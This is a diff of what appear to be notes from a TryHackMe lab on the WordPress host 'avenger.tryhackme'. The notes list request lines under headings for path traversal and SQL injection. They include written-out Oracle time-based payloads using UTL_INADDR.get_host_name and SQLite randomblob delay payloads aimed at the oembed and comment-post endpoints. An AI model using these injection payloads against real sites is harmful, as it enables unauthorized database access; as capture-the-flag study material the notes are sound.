@@ -260,19 +260,21 @@ http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=xml&url=%2Fembed
 http://avenger.tryhackme/gift/#?secret=YajmwYABoc
 
 
-http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=xml&url=%2Fembed
-SQL
+### Path Traversal
+GET http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=xml&url=%2Fembed
+
+### SQL Injection
 http://avenger.tryhackme/gift/?p=499-2
-SQL - Oracle - Time base
+### SQL - Oracle - Time base
 http://avenger.tryhackme/gift/wp-comments-post.php
-http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=xml&url=http%3A%2F%2Favenger.tryhackme%2Fgift%2F2023%2F06%2F27%2Fhello-world%2F%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22
-http://avenger.tryhackme/gift/wp-comments-post.php
-SQL - SQLite
+GET http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=xml&url=http%3A%2F%2Favenger.tryhackme%2Fgift%2F2023%2F06%2F27%2Fhello-world%2F%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22
+POST http://avenger.tryhackme/gift/wp-comments-post.php
+### SQL - SQLite
 GET http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+&url=http%3A%2F%2Favenger.tryhackme%2Fgift%2F2023%2F06%2F27%2Fhello-world%2F
 GET http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=xml&url=case+randomblob%28100000%29+when+not+null+then+1+else+1+end+
-http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?url=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+
-http://avenger.tryhackme/gift/
-http://avenger.tryhackme/gift/wp-comments-post.php
+GET http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?url=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+
+POST http://avenger.tryhackme/gift/
+POST http://avenger.tryhackme/gift/wp-comments-post.php
 
 
 
